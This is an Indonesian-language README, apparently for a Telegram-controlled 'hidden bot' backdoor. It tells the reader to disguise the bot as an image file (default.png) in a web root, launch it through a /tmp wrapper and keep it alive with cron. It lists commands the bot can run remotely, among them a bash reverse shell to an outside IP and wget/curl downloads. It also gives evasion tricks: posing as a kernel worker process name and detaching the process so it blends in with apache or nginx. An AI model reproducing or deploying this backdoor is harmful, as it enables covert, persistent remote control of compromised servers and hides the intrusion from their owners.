# hidden bot Wrapper Script


</h1>
<h4 align="center">command list</h4>

<p align="center">
    <img src="https://img.shields.io/badge/release-Prv8-blue.svg">
    <img src="https://img.shields.io/badge/issues-0-red.svg">
    <img src="https://img.shields.io/badge/php-7-green.svg">
    <img src="https://img.shields.io/badge/php-5-green.svg">
</p>
📌 Konsep Wrapper Script dalam Eksekusi Bot Telegram adalah, <br> skrip perantara yang digunakan untuk menjalankan program atau skrip lain secara tidak langsung. <br> Ini berguna untuk menyembunyikan, menyederhanakan, atau mengontrol eksekusi skrip utama.<br>

Dalam kasus ini, kita memiliki: <br>

Skrip utama (default.png) yang sebenarnya adalah bot Telegram, <br> tetapi namanya disamarkan agar terlihat seperti file gambar. <br>
Wrapper script (dockerbot), yang bertindak sebagai perantara untuk menjalankan default.png.

📂 Struktur File
```
/var/www/html/default.png  --> Skrip utama bot (disamarkan sebagai file gambar)
/tmp/img/dockerbot         --> Wrapper script untuk menjalankan default.png
```
📜 Isi Wrapper Script (dockerbot)
```
#!/bin/bash
/var/www/html/default.png
```

📌 Penjelasan:
```
#!/bin/bash → Menentukan bahwa skrip ini dijalankan menggunakan Bash.
/var/www/html/default.png → Memanggil skrip utama bot yang disamarkan sebagai file gambar.
Jadi, setiap kali dockerbot dijalankan, sebenarnya yang terjadi adalah default.png (yang merupakan bot Telegram) akan dieksekusi.
```
<br>
<br>
<br>
<br>


📌cara eksekusi
<br>
1️⃣ Buat file /tmp/img/dockerbot

Isi dengan:

```
#!/bin/bash
/sesuaikan/dengan/lokasi/botpng/default.png
```
2️⃣ Beri izin eksekusi
```
chmod 777 /tmp/img/dockerbot
```

3️⃣ menjalankan bot 

```
bash /tmp/img/dockerbot
```



apasaja yg bisa di jalankan di bot telegram

```
perintah Linux apa saja, termasuk:

✅ ls -la → Menampilkan daftar file dengan detail.
✅ wget http://example.com/file → Mengunduh file dari internet.
✅ curl -O http://example.com/file → Alternatif download selain wget.
✅ ps aux → Melihat daftar proses.
✅ netstat -tulnp → Melihat koneksi jaringan.
✅ whoami && id → Cek user dan grup aktif.
✅ bash -i >& /dev/tcp/1.2.3.4/4444 0>&1 → Reverse shell ke listener.
✅ dan semua command linux 


🔥 Fitur systemd
✅ Monitoring bot setiap 5 menit menggunakan cronjob
✅ Jika bot mati, otomatis dijalankan ulang. otomatis
✅ Mengirim pesan saat bot mati (misalnya karena kill, CTRL+C, atau shutdown)

```
<br>
<br>
<br>
<br>
<br>

📌NOTE bot ini masih bisa di modifikasi dengan metode :
```
Ubah Nama Proses di Runtime (Fake Process Name)
exec -a "[kworker/u8:2]" /var/www/html/default.png
💡 Efek: Saat dicek dengan ps aux atau pgrep -af, proses akan terlihat sebagai [kworker/u8:2] (nama biasa untuk kernel worker).

📌Jalankan Proses dengan PPID Palsu
Agar tidak terlihat mencurigakan, <br> bisa jalankan bot di bawah proses parent yang sudah ada, misalnya apache2 atau nginx:
nohup setsid /var/www/html/default.png > /dev/null 2>&1 &
💡 Efek: Bot terlihat sebagai bagian dari apache/nginx saat dicek dengan pstree atau ps.
Dengan kombinasi metode ini, bot jadi lebih stealth tanpa akses root. 🔥
```

